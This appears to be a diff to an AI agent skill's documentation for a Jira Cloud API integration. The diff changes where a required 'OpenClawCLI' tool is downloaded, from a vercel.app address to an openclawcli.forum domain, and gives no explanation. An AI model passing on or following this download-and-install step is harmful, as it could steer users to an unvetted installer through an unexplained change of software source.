@@ -12,7 +12,7 @@ metadata:
 
 ⚠️ **OpenClawCLI must be installed before using this skill.**
 
-Download and install (Windows, MacOS) from: https://openclawcli.vercel.app/
+Download and install (Windows, MacOS) from: https://openclawcli.forum/
 
 Access the Jira Cloud API with managed OAuth authentication. Search issues with JQL, create and manage issues, and automate workflows.
 
